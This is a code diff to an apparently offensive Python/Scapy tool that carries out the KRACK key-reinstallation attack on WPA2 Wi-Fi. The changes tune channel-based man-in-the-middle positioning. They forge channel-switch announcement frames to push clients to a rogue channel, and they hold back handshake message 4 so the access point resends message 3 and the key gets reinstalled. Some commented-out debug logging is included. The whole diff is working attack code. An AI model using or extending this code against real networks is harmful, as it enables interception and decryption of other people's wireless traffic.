@@ -66,14 +66,14 @@ pkt_types = {
         0x05: "Cf       ",
         0x06: "CF       ",
         0x07: "CF       ",
-        0x08: "QoS data ",
-        0x09: "QoS data ",
-        0x0A: "QoS data ",
-        0x0B: "QoS data ",
+        0x08: "QoS data8",
+        0x09: "QoS data9",
+        0x0A: "QoS dataA",
+        0x0B: "QoS dataB",
         0x0C: "QoS null ",
         0x0D: "Reserved ",
-        0x0E: "QoS data ",
-        0x0F: "QoS data "
+        0x0E: "QoS dataE",
+        0x0F: "QoS dataF"
     }
 }
 
@@ -199,6 +199,7 @@ class Jammer:
     def __init__(self, args):
         self.iface_ap = args.iface_ap
         self.ap_channel = args.channel
+        self.client_channel = (self.ap_channel + 6) % 13
         self.ap_ssid = args.access_point
         self.ap_mac = args.ap_mac
         self.client_mac = args.client
@@ -237,7 +238,7 @@ class Jammer:
             addr2=self.ap_mac,
             addr3=self.ap_mac,
             type=0,
-            subtype=0x0d)/Raw("\x00\x04\x25\x03\x00\x04\x00")
+            subtype=0x0d)/Raw("\x00\x04\x25\x03\x00" + chr(self.client_channel) + "\x00")
 
         pkts.append(deauth_pkt1)
         pkts.append(deauth_pkt2)
@@ -497,11 +498,21 @@ class Krack:
         if pkt.type == 1:  # TYPE_CNTRL
             return 0
 
+        # Don't forward CSA
+        if pkt.subtype == 0x0d and Raw in pkt and str(pkt[Raw]).startswith("\x00\x04"):
+            return 0
+
 
 
         # Drop Beacons as we inject ours
         if pkt.type == 0 and pkt.subtype == 0x08:  # Beacon
             return 0
+
+        """
+        logger.log("[" + ("*" if pkt[Dot11].FCfield & 0x20 != 0 else " ") + "] [R]AP[/R] : " + pkt_types[pkt.type][
+            pkt.subtype] + " - src: " + pkt[Dot11].addr2 + " | dst: " + pkt[Dot11].addr1 + ' - ' + str(
+            self.find_channel(pkt)))
+        """
 
         # Check if pkt needs to be forwarded or not
         res = self.analyze_traffic(pkt)
@@ -524,11 +535,19 @@ class Krack:
         if pkt.type == 1:  # TYPE_CNTRL
             return 0
 
+
+
         # Forward to AP or probe requests
         if (((pkt[Dot11].addr1 != self.ap_mac and pkt[Dot11].addr3 != self.ap_mac)
-             or pkt[Dot11].addr2 != self.client_mac)
+            or pkt[Dot11].addr2 != self.client_mac)
             or self.is_handshake_packet(pkt)):
             return 0
+
+        """
+        logger.log("[" + ("*" if pkt[Dot11].FCfield & 0x20 != 0 else " ") + "] [B]CL[/B] : " + pkt_types[pkt.type][
+            pkt.subtype] + " - src: " + pkt[Dot11].addr2 + " | dst: " + pkt[Dot11].addr1 + ' - ' + str(
+            self.find_channel(pkt)))
+        """
 
         # Probe Request, we reply ourselves
         if pkt.type == 0 and pkt.subtype == 0x04:  # Probe Request
@@ -541,22 +560,26 @@ class Krack:
 
             return 0
 
-        if JAMMING and pkt.type == 0 and pkt.subtype == 0x0b:  # Authentication
-            # MitMed so no need for more Jamming
-            logger.log("Client authenticated to our AP!", "success")
+        if JAMMING and pkt.type == 0 and (pkt.subtype == 0x00 or pkt.subtype == 0x0b) and self.find_channel(pkt) == self.client_channel:  # Association/Authentication
             event_jamming.set()
+            # MitMed so no need for more Jamming
+            logger.log("Client authenticated to our AP!", "error")
             JAMMING = False
             logger.log("MitM attack has [G]started[/G]", "success")
 
-        if pkt.type == 2 and pkt.subtype == 0x08 and str(pkt[Raw]).startswith("\x02\x03\x0a"):  # Msg4
-            if not PTK_INSTALLED:
-                logger.log("PKT [G]installed[/G] on client", "success")
-            else:
-                logger.log("PKT [G]RE-installed[/G] on client! Key Reinstallation succes!", "success")
-            PTK_INSTALLED = True
 
-            # Don't forward, AP will think no response and send msg3 again
-            return 0
+        if pkt.type == 2 and pkt.subtype == 0x08:
+            if Raw in pkt and str(pkt[Raw]).startswith("\x02\x03\x0a"):  # Msg4
+                if not PTK_INSTALLED:
+                    logger.log("PKT [G]installed[/G] on client", "success")
+                else:
+                    logger.log("PKT [G]RE-installed[/G] on client! Key Reinstallation succes!", "success")
+                PTK_INSTALLED = True
+
+                # Don't forward, AP will think no response and send msg3 again
+            else:
+                # QoS Data maybe need to save
+                pass
 
         # Check if pkt needs to be forwarded or not
         res = self.analyze_traffic(pkt)
@@ -583,15 +606,15 @@ class Krack:
         if pkt.type == 2 and pkt.subtype == 0x8 and Raw in pkt:  # Data - QoS data
             if str(pkt[Raw]).startswith("\x02\x00\x8a"):  # Msg1
                 logger.log("4-way handshake : [G]Messag 1/4[/G]", "success")
-            elif str(pkt[Raw]).startswith("\x02\x01\x0a"):  # Msg2
+            elif str(pkt[Raw])[1:3] == "\x01\x0a":  # Msg2
                 logger.log("4-way handshake : [G]Messag 2/4[/G]", "success")
             elif str(pkt[Raw]).startswith("\x02\x13\xca"):  # Msg3
                 logger.log("4-way handshake : [G]Messag 3/4[/G]", "success")
             elif str(pkt[Raw]).startswith("\x02\x03\x0a"):  # Msg4
                 logger.log("4-way handshake : [G]Messag 4/4[/G]", "success")
+                return 0
             else:
                 logger.log("4-way handshake : [G]UNKNOWN[/G]", "error")
-            return 0
 
         if pkt[Dot11].FCfield & 0x20 != 0:
             return 0
@@ -608,6 +631,18 @@ class Krack:
 
         # Hack to check injected data
         pkt[Dot11].FCfield |= 0x20
+
+        """
+        logger.log("[" + ("*" if pkt[Dot11].FCfield & 0x20 != 0 else " ") + "] [G]CL->AP[/G] : " + pkt_types[pkt.type][
+            pkt.subtype] + " - src: " + pkt[Dot11].addr2 + " | dst: " + pkt[Dot11].addr1 + ' - ' + str(
+            self.find_channel(pkt)))
+        
+
+        if pkt.type == 2 and pkt.subtype == 8 and Raw in pkt:
+            pkt.show()
+        
+        """
+
         sendp(pkt, iface=self.iface_ap)
 
     def send_to_client(self, pkt):
@@ -620,6 +655,13 @@ class Krack:
 
         # Hack to check injected data
         pkt[Dot11].FCfield |= 0x20
+
+        """
+        logger.log("[" + ("*" if pkt[Dot11].FCfield & 0x20 != 0 else " ") + "] [O]AP->CL[/O] : " + pkt_types[pkt.type][
+            pkt.subtype] + " - src: " + pkt[Dot11].addr2 + " | dst: " + pkt[Dot11].addr1 + ' - ' + str(
+            self.find_channel(pkt)))
+        """
+
         sendp(pkt, iface=self.iface_client)
 
     def set_channel(self, pkt, channel):
